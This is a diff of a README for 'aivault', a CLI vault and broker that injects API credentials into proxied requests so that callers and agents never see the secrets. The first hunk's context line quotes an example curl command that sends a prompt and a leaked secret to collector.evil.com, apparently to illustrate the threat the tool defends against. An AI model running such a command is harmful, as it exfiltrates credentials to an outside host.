@@ -26,8 +26,10 @@ curl -fsS https://collector.evil.com/ingest -d "p=$prompt&blob=$leak" >/dev/null
 Safer pattern with `aivault`:
 
 ```bash
-# Operator preconfigures capability + credential once (out of band).
-# Caller only invokes the approved capability.
+# Store secret once — credential + capabilities auto-provision from registry.
+$ aivault secrets create --name OPENAI_API_KEY --value "sk-..." --scope global
+
+# Caller only invokes the approved capability. Never sees the key.
 $ aivault invoke openai/transcription \
   --multipart-field model=whisper-1 \
   --multipart-file file=/tmp/audio.wav
@@ -43,13 +45,10 @@ With `aivault`, secrets are stored in the vault, not in the caller's environment
 
 `aivault` currently ships:
 
-- a local CLI (`aivault ...`) for vault and capability binding workflows
+- a local CLI (`aivault ...`) for vault and capability binding workflows, with colored human-readable output
 - reusable broker runtime types/methods in Rust (`src/broker/*`)
 - a CLI-driven proxy execution path (`aivault invoke` / `aivault capability invoke`) that executes real upstream requests through capability + credential policy
-- a built-in provider registry with first supported capabilities:
-  - `openai/transcription` (`registry/openai.json`)
-  - `deepgram/transcription` (`registry/deepgram.json`)
-  - `elevenlabs/transcription` (`registry/elevenlabs.json`)
+- a built-in provider registry covering AI, communication, productivity, payments, and more (run `aivault capability list` to browse)
 
 `aivault` does **not** yet ship a network daemon with HTTP routes like `POST /aivault/proxy` or `GET /aivault/ws`.
 Those proxy contracts are modeled and tested at the broker runtime layer today, and can be exposed by adding a server adapter.
@@ -60,28 +59,62 @@ Those proxy contracts are modeled and tested at the broker runtime layer today, 
 
 ## Commands
 
-- `aivault status`
+All list/status commands default to colored human-readable output. Pass `--verbose` / `-v` for full JSON.
+
+### Vault lifecycle
+
+- `aivault status` — show vault state, provider, and paths
 - `aivault init --provider <macos-keychain|env|file|passphrase> ...`
 - `aivault unlock --passphrase <value>`
 - `aivault lock`
 - `aivault rotate-master [--new-key <base64>] [--new-passphrase <value>]`
 - `aivault audit [--limit <n>] [--before-ts-ms <ms>]`
-- `aivault secrets list/create/update/rotate/delete/...` (legacy capability-binding surface remains)
-- `aivault oauth setup --provider ... --auth-url ... --client-id ... --redirect-uri ... [--scope ...]`
+
+### Secrets
+
+- `aivault secrets list [--scope ...] [-v]` — list secrets (metadata only, no values)
+- `aivault secrets create --name ... --value ... [--scope ... --alias ...]` — if the name matches a registry provider's `vaultSecrets`, the secret is pinned to that provider and the credential + capabilities are auto-provisioned
+- `aivault secrets update --id ... [--name ... --alias ...]`
+- `aivault secrets rotate --id ... --value ...`
+- `aivault secrets delete --id ...`
+- `aivault secrets attach-group / detach-group --id ... --workspace-id ... --group-id ...`
+- `aivault secrets import --entry KEY=VALUE ... [--scope ...]`
+
+### Credentials
+
+For registry-backed providers, credentials are auto-provisioned when you create a secret with a matching name (e.g., `OPENAI_API_KEY` auto-creates the `openai` credential). Manual credential creation is only needed for custom/non-registry providers or per-tenant host overrides.
+
 - `aivault credential create <id> --provider ... --secret-ref vault:secret:<id> [--auth ... --host ...]`
-- `aivault credential list`
+- `aivault credential list [-v]` — list configured credentials
 - `aivault credential delete <id>`
+
+### Capabilities
+
+Browse and inspect available capabilities:
+
+- `aivault capability list [-v]` — list all capabilities (registered + built-in registry), grouped by readiness
+- `aivault capability describe <id>` — show how to invoke a capability (aliases: `args`, `shape`, `inspect`); works for any registry capability, no credential needed
 - `aivault capability create <id> --credential <credential-id> --method ... --path ... [--host ...]`
-- `aivault capability list`
 - `aivault capability delete <id>`
 - `aivault capability policy set --capability <id> [--rate-limit-per-minute ...] [--max-request-body-bytes ...] [--max-response-body-bytes ...] [--response-block ...]`
-- `aivault capability describe <id>` (aliases: `args`, `shape`, `inspect`)
-- `aivault capability invoke <id> ... [--workspace-id ... --group-id ...]` (alias: `call`)
-- `aivault capability json <id> ...` (alias: `aivault json`)
-- `aivault capability markdown <id> ...` (alias: `aivault markdown`, `aivault md`)
-- `aivault invoke <id> ... [--workspace-id ... --group-id ...]` (top-level alias of `capability invoke`)
-- `aivault json <id> ...` (prints upstream body parsed as JSON)
-- `aivault markdown <id> ...` (alias: `md`; prints upstream body as markdown)
+
+### Capability bindings
+
+- `aivault capability bindings [--capability ... --scope ... --consumer ...] [-v]` — list capability-to-secret bindings
+- `aivault capability bind --capability ... --secret-ref ... [--scope ... --consumer ...]`
+- `aivault capability unbind --capability ... [--scope ... --consumer ...]`
+
+### Invoke
+
+- `aivault invoke <id> ... [--workspace-id ... --group-id ...]` — execute a proxied request (top-level shortcut)
+- `aivault json <id> ...` — invoke and print response as JSON
+- `aivault markdown <id> ...` (alias: `md`) — invoke and print response as markdown
+- `aivault capability invoke <id> ...` (alias: `call`) — same as `aivault invoke`
+- `aivault capability json <id> ...` / `aivault capability markdown <id> ...`
+
+### OAuth
+
+- `aivault oauth setup --provider ... --auth-url ... --client-id ... --redirect-uri ... [--scope ...]`
 
 ## Quickstart (CLI)
 
@@ -94,14 +127,28 @@ export AIVAULT_DIR="$(mktemp -d)"
 # Inspect vault status (auto-initializes in a fresh dir)
 aivault status
 
-# Create a secret
+# Create a secret — registry credential + capabilities auto-provision
 aivault secrets create \
   --name OPENAI_API_KEY \
   --value sk-test \
   --scope global
+# → Secret created: OPENAI_API_KEY (pinned to provider: openai)
+# → Credential auto-provisioned: openai (17 capabilities enabled)
 
 # List secrets (values are never printed)
 aivault secrets list
+
+# Browse all available capabilities from the built-in registry
+# and see which have credentials already configured
+aivault capability list
+
+# Inspect a specific capability
+aivault capability describe openai/transcription
+
+# Invoke — secret is injected by the broker, never exposed to the caller
+aivault invoke openai/transcription \
+  --multipart-field model=whisper-1 \
+  --multipart-file file=/tmp/audio.wav
 ```
 
 ## Quickstart (pnpm)
@@ -115,13 +162,16 @@ pnpm dev -- markdown openai/transcription --path /v1/audio/transcriptions ...
 pnpm dev -- --help
 ```
 
-Note: `aivault json` intentionally does **not** return upstream response headers. In untrusted execution environments, headers can carry identifiers or cookies; use `aivault invoke` if you need raw upstream bytes, or add a purpose-built debug mode locally.
+Note: upstream response headers are intentionally stripped from all output modes. In untrusted execution environments, headers can carry identifiers or cookies that leak through agent context.
 
 Registry-backed capability example (`registry/openai.json`):
 
 ```json
 {
   "provider": "openai",
+  "vaultSecrets": {
+    "OPENAI_API_KEY": "secret"
+  },
   "auth": {
     "header": {
       "header_name": "authorization",
@@ -143,20 +193,22 @@ Registry-backed capability example (`registry/openai.json`):
 }
 ```
 
-Capability binding flow:
+The `vaultSecrets` field maps canonical secret names to auth template placeholders. When you run `aivault secrets create --name OPENAI_API_KEY ...`, the system matches this name to the registry, pins the secret to the `openai` provider, and auto-provisions the credential + capabilities.
+
+Capability binding flow (for manual/advanced use):
 
 ```bash
 # Bind capability -> secret
-aivault capabilities bind \
+aivault capability bind \
   --capability openai/transcription \
   --secret-ref vault:secret:<secret-id> \
   --scope global
 
-# Resolve capability to secret value
-aivault capabilities resolve \
-  --capability openai/transcription \
-  --raw
+# List bindings
+aivault capability bindings
 ```
+
+Note: for registry-backed providers, binding happens automatically when you create the secret. Manual binding is only needed for custom capabilities or advanced overrides.
 
 OAuth setup helper (consent/exchange stays outside broker):
 
@@ -169,56 +221,183 @@ aivault oauth setup \
   --scope gmail.readonly
 ```
 
-## Make proxied requests (CLI)
+## How the proxy works
 
-This is the minimum end-to-end flow today without running a daemon:
+Every proxied request flows through the broker's zero-trust pipeline. Callers never see secrets — the broker injects auth on the wire.
+
+```
+Caller (CLI / agent / SDK)
+  │
+  │  envelope: { capability, request: { method, path, headers, body } }
+  ▼
+Broker runtime
+  ├─ validate capability policy (allowed methods, path prefixes, hosts)
+  ├─ resolve credential for provider (secret ref → decrypt from vault)
+  ├─ inject auth into outgoing request (header / query / path / basic / OAuth2 / etc.)
+  ├─ enforce advanced policy (rate limits, body size limits, response blocklist)
+  ├─ build planned request (scheme + host derived from capability, not caller)
+  │
+  ▼
+Upstream provider (api.openai.com, api.stripe.com, etc.)
+  │
+  ▼
+Broker response pipeline
+  ├─ filter response headers (strip auth-class headers)
+  ├─ apply response body blocklist (redact sensitive fields)
+  └─ return sanitized response to caller
+```
+
+Key security properties:
+
+- **Registry-pinned secrets** — secrets with names claimed by the built-in registry (e.g., `OPENAI_API_KEY`) are immutably pinned to that provider. A pinned secret can only be injected into requests matching the registry provider's hosts, blocking exfiltration through fake capabilities or credentials.
+- **Host is derived from policy**, not the caller's request — prevents SSRF / exfiltration
+- **Auth headers are broker-owned** — callers cannot supply or override auth-class headers
+- **Path traversal rejected** — `../` and similar sequences are normalized and checked
+- **Redirect auth stripping** — redirects do not carry auth headers to other domains
+- **Localhost-only by default** — proxy tokens are only accepted from `127.0.0.1` unless explicitly configured
+
+## Auth strategies
+
+The registry and credential system support these auth strategies:
+
+| Strategy       | Description                               | Example providers                                           |
+| -------------- | ----------------------------------------- | ----------------------------------------------------------- |
+| `header`       | Single header with `{{secret}}` template  | OpenAI (`Bearer`), Anthropic (`x-api-key`), Discord (`Bot`) |
+| `query`        | API key as query parameter                | Gemini, YouTube Data                                        |
+| `path`         | Secret injected into URL path prefix      | Telegram (`/bot{{secret}}/...`)                             |
+| `basic`        | HTTP Basic auth (`username:password`)     | Twilio, Mailgun                                             |
+| `multi-header` | Multiple headers from a JSON secret       | Datadog (`DD-API-KEY` + `DD-APPLICATION-KEY`)               |
+| `multi-query`  | Multiple query params from a JSON secret  | Trello (`key` + `token`)                                    |
+| `oauth2`       | Client credentials or refresh token grant | Spotify, QuickBooks, Xero, Reddit                           |
+| `aws-sigv4`    | AWS Signature V4 signing                  | AWS S3, Bedrock                                             |
+| `hmac`         | HMAC signature of request body            | Webhook verification                                        |
+| `mtls`         | Mutual TLS client certificate             | Enterprise APIs                                             |
+
+For registry-backed providers, auth strategy is defined in the registry JSON and automatically applied when the credential is auto-provisioned from `secrets create`. If you create a credential manually for a registry provider, you don't need to specify `--auth` explicitly.
+
+## OAuth2 lifecycle
+
+For providers that use OAuth2 (Spotify, QuickBooks, Xero, Reddit, etc.), the token exchange happens **outside** the broker boundary — `aivault` only handles the refresh/runtime phase:
+
+```
+1. Consent + code exchange (outside aivault)
+   ┌──────────────────────────────────────────────────┐
+   │ aivault oauth setup --provider google \           │
+   │   --auth-url https://accounts.google.com/... \    │
+   │   --client-id <id> --redirect-uri <uri>           │
+   │                                                    │
+   │ → Returns consentUrl — open in browser             │
+   │ → Exchange auth code for tokens using your runtime │
+   └──────────────────────────────────────────────────┘
+
+2. Store tokens in vault (credential auto-provisions)
+   ┌──────────────────────────────────────────────────┐
+   │ aivault secrets create --name SPOTIFY_OAUTH \     │
+   │   --value '{"clientId":"...","clientSecret":"...",│
+   │            "refreshToken":"..."}'                 │
+   │                                                    │
+   │ → Credential auto-provisioned: spotify             │
+   └──────────────────────────────────────────────────┘
+
+3. Runtime (automatic)
+   ┌──────────────────────────────────────────────────┐
+   │ aivault invoke spotify/playlists ...              │
+   │                                                    │
+   │ Broker automatically:                              │
+   │ → Checks if access_token is expired                │
+   │ → Refreshes via token endpoint if needed           │
+   │ → Writes new tokens back to vault                  │
+   │ → Injects Bearer token into request                │
+   └──────────────────────────────────────────────────┘
+```
+
+## Provider registry
+
+aivault compiles a built-in registry of provider definitions from the `registry/` directory into the binary to avoid forgeries. Each registry provider declares `vaultSecrets` — the canonical secret names it claims (e.g., `OPENAI_API_KEY` for openai). When you store a secret with a claimed name, it is pinned to that provider and the credential + capabilities are auto-provisioned.
+
+You can still extend the registry with your own providers locally (and that is slightly less secure fyi), but the best defense is to contribute any missing entries back to this official registry.
+
+The built-in registry ships provider definitions across these categories:
+
+- **AI / ML**: OpenAI, Anthropic, Gemini, Replicate, OpenRouter, ElevenLabs, Deepgram
+- **Communication**: Slack, Discord, Twilio, Telegram
+- **Productivity**: Notion, Airtable, Linear, Todoist, Calendly, Trello
+- **CRM**: HubSpot, Intercom
+- **Email**: Resend, SendGrid, Postmark, Mailgun
+- **E-commerce / Payments**: Shopify, Stripe, Square
+- **Accounting**: QuickBooks, Xero
+- **Social / Media**: X, Reddit, Spotify, YouTube Data
+- **Dev tools**: GitHub
+- **Maps / Places**: Google Places
+
+Run `aivault capability list` to see all available capabilities, or `aivault capability describe <id>` to inspect any one.
+
+### Per-tenant hosts
+
+Some providers (Shopify, Zendesk, Supabase, Jira, Mailchimp) use per-tenant hostnames like `{store}.myshopify.com`. The registry defines host patterns with wildcards; you bind your specific host when creating a credential:
+
+```bash
+aivault credential create my-shopify \
+  --provider shopify \
+  --secret-ref vault:secret:<id> \
+  --host my-store.myshopify.com
+```
+
+The broker validates that your host matches the registry's allowed pattern.
+
+## End-to-end proxy example (CLI)
+
+This is the minimum flow to make a proxied request with a registry-backed provider:
 
 ```bash
 export AIVAULT_DIR="$(mktemp -d)"
 
-# 1) Store secret material in the vault.
-secret_id=$(
-  aivault secrets create --name OPENAI_API_KEY --value sk-test --scope global \
-  | sed -n 's/.*"secretId": "\([^"]*\)".*/\1/p'
-)
+# 1) Store secret — credential + capabilities auto-provision from registry.
+aivault secrets create --name OPENAI_API_KEY --value sk-test --scope global
 
-# 2) Create broker credential policy (provider/auth/hosts + secretRef).
-aivault credential create openai \
-  --provider openai \
-  --secret-ref "vault:secret:$secret_id" \
-  --auth header \
-  --host postman-echo.com
+# 2) List capabilities that are now ready.
+aivault capability list
 
-# 3) Create capability policy.
-aivault capability create openai/get \
-  --credential openai \
-  --method GET \
-  --path /get
+# 3) See what call args are required/optional.
+aivault capability describe openai/transcription
 
-# 4) See what call args are required/optional for this capability.
-aivault capability describe openai/get
-
-# 5) Execute proxied request through capability policy.
-aivault invoke openai/get --path '/get?foo=bar'
-
-# Alternate: pass full request JSON from a file.
-cat > /tmp/request.json <<'JSON'
-{"method":"GET","path":"/get?foo=bar","headers":[]}
-JSON
-aivault capability invoke openai/get --request-file /tmp/request.json
+# 4) Execute proxied request through capability policy.
+aivault invoke openai/transcription \
+  --multipart-field model=whisper-1 \
+  --multipart-file file=/tmp/audio.wav
 ```
 
-This returns JSON containing planned request details and the proxied upstream response (status/headers/body).
+For multi-secret providers like Trello, the credential auto-provisions once all required secrets are present:
+
+```bash
+aivault secrets create --name TRELLO_API_KEY --value "your-key" --scope global
+# → Waiting for TRELLO_TOKEN to complete trello credential
+
+aivault secrets create --name TRELLO_TOKEN --value "your-token" --scope global
+# → Credential auto-provisioned: trello (17 capabilities enabled)
+```
+
+For custom/non-registry providers, you still create credentials manually:
+
+```bash
+aivault secrets create --name MY_CUSTOM_KEY --value "..." --scope global
+
+aivault credential create my-provider \
+  --provider my-provider \
+  --secret-ref "vault:secret:<secret-id>" \
+  --auth header \
+  --host api.example.com
+```
 
 ## HTTP contract status
 
-If you want to call using:
+The broker runtime models three network contracts:
 
-- `POST /aivault/proxy`
-- `GET /aivault/ws`
-- `/v/{credential}/...`
+- `POST /aivault/proxy` — envelope-based proxied request
+- `GET /aivault/ws` — WebSocket upgrade through capability policy
+- `/v/{credential}/...` — passthrough proxy (host swap + auth injection)
 
-those contracts are implemented at the broker runtime model level, but this repo still needs a network adapter/daemon to expose those routes.
+These contracts are fully implemented and tested at the broker runtime layer, but this repo does **not** yet ship a network daemon with HTTP routes.
 Use `aivault invoke` (or `aivault capability invoke`) today for real request execution.
 
 ### Daemon boundary (`aivaultd`)
@@ -226,30 +405,17 @@ Use `aivault invoke` (or `aivault capability invoke`) today for real request exe
 On unix platforms (macOS/Linux), capability invocation defaults to a local daemon boundary:
 
 - `aivault invoke ...` will connect to `aivaultd` over a unix socket, and **auto-start** the daemon if needed.
+- Secret decryption and auth injection happen inside the daemon process, not the CLI process.
 - Set `AIVAULTD_DISABLE=1` to force in-process execution (dev/debug).
 - Set `AIVAULTD_AUTOSTART=0` to require a daemon already running (no autostart).
 - Set `AIVAULTD_SOCKET=/path/to.sock` to override the socket path.
 
-## Calling broker runtime directly (Rust)
-
-If you need proxy planning behavior today, call broker APIs in-process:
-
-```rust
-use aivault::broker::{Broker, RequestAuth, ProxyEnvelope};
-
-let mut broker = Broker::default();
-let envelope = Broker::parse_envelope(r#"{"capability":"x","request":{"method":"GET","path":"/v1"}}"#)?;
-let planned = broker.execute_envelope(&RequestAuth::Proxy("token".into()), envelope, "127.0.0.1".parse()?);
-```
-
-The network adapter layer (HTTP/WS server exposing `/aivault/proxy`, `/v/{credential}/...`, `/aivault/ws`) is planned but not included yet in this repo.
-
 ## Quality checks
 
-- `make lint` runs `cargo fmt --all -- --check` and `cargo clippy --all-targets --all-features -- -D warnings`
-- `make test` runs `cargo test --all-targets --all-features`
-- `make check` runs `cargo check --all-targets --all-features`
-- `make ci` runs the full local CI chain (`lint` + `test`)
+- `pnpm lint` — `cargo clippy` with `-D warnings`
+- `pnpm test` — `cargo test --all-targets --all-features`
+- `pnpm check-types` — `cargo check`
+- `pnpm format` — `cargo fmt`
 
 ### E2E test suites
 
@@ -300,12 +466,3 @@ Inside the vault root:
 - `audit/*.jsonl` for append-only audit events
 - `capabilities.json` for capability-to-secret bindings
 - `broker.json` for credential/capability/policy records used by `aivault credential ...` and `aivault capability ...`
-
-## Reintegration notes
-
-The repository keeps extraction boundaries stable:
-
-- `src/vault/*` is the reusable vault runtime core
-- `src/app.rs`, `src/cli.rs`, and `src/capabilities.rs` are CLI/operator orchestration layers
-
-This allows host-specific adapters to be added without forking vault internals.
